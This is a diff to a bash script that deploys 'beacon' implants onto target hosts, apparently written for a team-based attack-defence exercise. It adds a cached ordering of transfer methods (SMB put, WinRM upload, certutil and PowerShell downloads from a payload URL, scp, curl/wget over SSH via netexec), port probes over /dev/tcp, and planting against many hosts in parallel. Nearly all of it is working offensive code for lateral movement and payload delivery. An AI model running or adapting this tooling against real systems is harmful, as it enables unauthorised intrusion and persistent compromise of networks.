@@ -54,7 +54,7 @@ PASS=""
 USER_OVERRIDE=""
 BEACON_URL=""
 TARGET_ARG=""
-TIMEOUT=2
+TIMEOUT=1
 USE_INTERNAL=0
 SPECIFIC_BIN=""
 
@@ -137,6 +137,7 @@ fi
 # Globals used by transfer functions — set per-binary in the plant loop
 BEACON_FILE=""
 BEACON_NAME=""
+LAST_XFER=""  # method cache: reuse what worked for previous binary on same host
 
 echo "[+] Binaries: ${BEACON_FILES[*]}"
 echo "[+] Targets : ${TARGETS[*]}"
@@ -203,9 +204,16 @@ fi
 echo ""
 
 # ====================== HELPERS ======================
+declare -A PORT_CACHE
 port_open() {
   local ip="$1" port="$2"
+  local key="${ip}:${port}"
+  if [[ -v PORT_CACHE["$key"] ]]; then
+    return ${PORT_CACHE["$key"]}
+  fi
   timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
+  PORT_CACHE["$key"]=$?
+  return ${PORT_CACHE["$key"]}
 }
 
 # Generate a random-looking drop path (Windows)
@@ -455,82 +463,93 @@ exec_beacon() {
 }
 
 # ====================== TRANSFER + EXEC ONE BINARY ======================
-# Called with: transfer_exec_one <ip> <user> <hostname>
-# Uses globals: BEACON_FILE, BEACON_NAME, USE_KERBEROS, AUTH_FLAG, PASS, etc.
+# Called with: transfer_exec_one <ip> <user> <hostname> <authed_proto>
+# Uses globals: BEACON_FILE, BEACON_NAME, USE_KERBEROS, AUTH_FLAG, PASS, LAST_XFER
 transfer_exec_one() {
   local ip="$1" authed_user="$2" hostname="$3" authed_proto="$4"
 
   echo "    --- ${BEACON_NAME} ---"
 
-  # ---- Pick drop locations ----
   local rand_path
   rand_path=$(random_drop_path)
+  local all_dests=("$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}")
 
-  # ---- TRANSFER (try each method × each path until one works) ----
   REMOTE_PATH=""
   local transferred=0
 
-  # Attempt 1: SMB file put (random path, then safe paths)
-  for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
-    if transfer_smb_put "$ip" "$authed_user" "$dest"; then
-      echo "    [+] Transferred via SMB put → $REMOTE_PATH"
-      transferred=1; break
-    fi
+  # Build method order: cached method first → URL-first if -w given → file upload
+  local methods=()
+  [[ -n "$LAST_XFER" ]] && methods+=("$LAST_XFER")
+  if [[ -n "$BEACON_URL" ]]; then
+    methods+=(certutil iwr smb_put winrm)
+  else
+    methods+=(smb_put winrm certutil iwr)
+  fi
+  [[ "$authed_proto" == "ssh" ]] && methods+=(scp url_ssh)
+
+  # Deduplicate (cached method may already be in the list)
+  local seen=() unique=()
+  for m in "${methods[@]}"; do
+    local dup=0
+    for s in "${seen[@]+"${seen[@]}"}"; do [[ "$s" == "$m" ]] && { dup=1; break; }; done
+    [[ $dup -eq 0 ]] && { unique+=("$m"); seen+=("$m"); }
   done
 
-  # Attempt 2: WinRM base64 upload
-  if [[ $transferred -eq 0 ]]; then
-    for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
-      if transfer_winrm "$ip" "$authed_user" "$dest"; then
-        echo "    [+] Transferred via WinRM upload → $REMOTE_PATH"
-        transferred=1; break
-      fi
-    done
-  fi
-
-  # Attempt 3: certutil download from URL
-  if [[ $transferred -eq 0 && -n "$BEACON_URL" ]]; then
-    for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
-      for proto in smb winrm wmi; do
-        if transfer_url_certutil "$ip" "$authed_user" "$dest" "$proto"; then
-          echo "    [+] Transferred via certutil ($proto) → $REMOTE_PATH"
-          transferred=1; break 2
-        fi
-      done
-    done
-  fi
-
-  # Attempt 4: PowerShell IWR download from URL
-  if [[ $transferred -eq 0 && -n "$BEACON_URL" ]]; then
-    for dest in "$rand_path" "${SAFE_PATHS[@]/%/\\${BEACON_NAME}}"; do
-      for proto in smb winrm wmi; do
-        if transfer_url_iwr "$ip" "$authed_user" "$dest" "$proto"; then
-          echo "    [+] Transferred via IWR ($proto) → $REMOTE_PATH"
-          transferred=1; break 2
-        fi
-      done
-    done
-  fi
-
-  # SSH: scp or URL-based wget/curl
-  if [[ $transferred -eq 0 && "$authed_proto" == "ssh" ]]; then
-    if [[ -n "$BEACON_FILE" ]]; then
-      sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
-        "$BEACON_FILE" "${authed_user}@${ip}:/tmp/${BEACON_NAME}" 2>/dev/null && {
-        REMOTE_PATH="/tmp/${BEACON_NAME}"
-        echo "    [+] Transferred via SCP → $REMOTE_PATH"
-        transferred=1
-      }
-    fi
-    if [[ $transferred -eq 0 && -n "$BEACON_URL" ]]; then
-      local dl_cmd="curl -sSo /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null || wget -qO /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null"
-      netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>/dev/null && {
-        REMOTE_PATH="/tmp/${BEACON_NAME}"
-        echo "    [+] Transferred via URL download (SSH) → $REMOTE_PATH"
-        transferred=1
-      }
-    fi
-  fi
+  for method in "${unique[@]}"; do
+    [[ $transferred -eq 1 ]] && break
+    case "$method" in
+      smb_put)
+        for dest in "${all_dests[@]}"; do
+          if transfer_smb_put "$ip" "$authed_user" "$dest"; then
+            echo "    [+] Transferred via SMB put → $REMOTE_PATH"
+            LAST_XFER="smb_put"; transferred=1; break
+          fi
+        done ;;
+      winrm)
+        for dest in "${all_dests[@]}"; do
+          if transfer_winrm "$ip" "$authed_user" "$dest"; then
+            echo "    [+] Transferred via WinRM upload → $REMOTE_PATH"
+            LAST_XFER="winrm"; transferred=1; break
+          fi
+        done ;;
+      certutil)
+        [[ -z "$BEACON_URL" ]] && continue
+        for dest in "${all_dests[@]}"; do
+          for proto in smb winrm wmi; do
+            if transfer_url_certutil "$ip" "$authed_user" "$dest" "$proto"; then
+              echo "    [+] Transferred via certutil ($proto) → $REMOTE_PATH"
+              LAST_XFER="certutil"; transferred=1; break 2
+            fi
+          done
+        done ;;
+      iwr)
+        [[ -z "$BEACON_URL" ]] && continue
+        for dest in "${all_dests[@]}"; do
+          for proto in smb winrm wmi; do
+            if transfer_url_iwr "$ip" "$authed_user" "$dest" "$proto"; then
+              echo "    [+] Transferred via IWR ($proto) → $REMOTE_PATH"
+              LAST_XFER="iwr"; transferred=1; break 2
+            fi
+          done
+        done ;;
+      scp)
+        [[ -z "$BEACON_FILE" ]] && continue
+        sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
+          "$BEACON_FILE" "${authed_user}@${ip}:/tmp/${BEACON_NAME}" 2>/dev/null && {
+          REMOTE_PATH="/tmp/${BEACON_NAME}"
+          echo "    [+] Transferred via SCP → $REMOTE_PATH"
+          LAST_XFER="scp"; transferred=1
+        } ;;
+      url_ssh)
+        [[ -z "$BEACON_URL" ]] && continue
+        local dl_cmd="curl -sSo /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null || wget -qO /tmp/${BEACON_NAME} '${BEACON_URL}' 2>/dev/null"
+        netexec ssh "$ip" -u "$authed_user" -p "$PASS" -x "$dl_cmd" 2>/dev/null && {
+          REMOTE_PATH="/tmp/${BEACON_NAME}"
+          echo "    [+] Transferred via URL download (SSH) → $REMOTE_PATH"
+          LAST_XFER="url_ssh"; transferred=1
+        } ;;
+    esac
+  done
 
   if [[ $transferred -eq 0 ]]; then
     echo "    [-] All transfer methods failed for ${BEACON_NAME}"
@@ -669,20 +688,41 @@ plant_on_host() {
 }
 
 # ====================== MAIN ======================
-PLANTED=0
-FAILED=0
-
 echo "[*] Planting on team ${TEAM}..."
 echo ""
 
-for host in "${TARGETS[@]}"; do
-  if plant_on_host "$host"; then
-    ((PLANTED++))
-  else
-    ((FAILED++))
-  fi
+if [[ ${#TARGETS[@]} -eq 1 ]]; then
+  # Single target — run directly (no parallel overhead)
+  PLANTED=0 FAILED=0
+  if plant_on_host "${TARGETS[0]}"; then ((PLANTED++)); else ((FAILED++)); fi
   echo ""
-done
+else
+  # Multiple targets — run in parallel
+  TMPDIR=$(mktemp -d)
+  trap 'rm -rf "$TMPDIR"' EXIT
+  pids=()
+
+  for host in "${TARGETS[@]}"; do
+    (
+      plant_on_host "$host" > "${TMPDIR}/${host}.log" 2>&1
+      echo $? > "${TMPDIR}/${host}.rc"
+    ) &
+    pids+=($!)
+  done
+
+  echo "[*] ${#TARGETS[@]} hosts running in parallel — waiting..."
+  for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done
+  echo ""
+
+  # Print collected output and tally results
+  PLANTED=0 FAILED=0
+  for host in "${TARGETS[@]}"; do
+    cat "${TMPDIR}/${host}.log"
+    echo ""
+    rc=$(cat "${TMPDIR}/${host}.rc" 2>/dev/null || echo 1)
+    if [[ $rc -eq 0 ]]; then ((PLANTED++)); else ((FAILED++)); fi
+  done
+fi
 
 echo "=========================================="
 echo "[*] Results: ${PLANTED} host(s) planted, ${FAILED} failed out of ${#TARGETS[@]} targets"
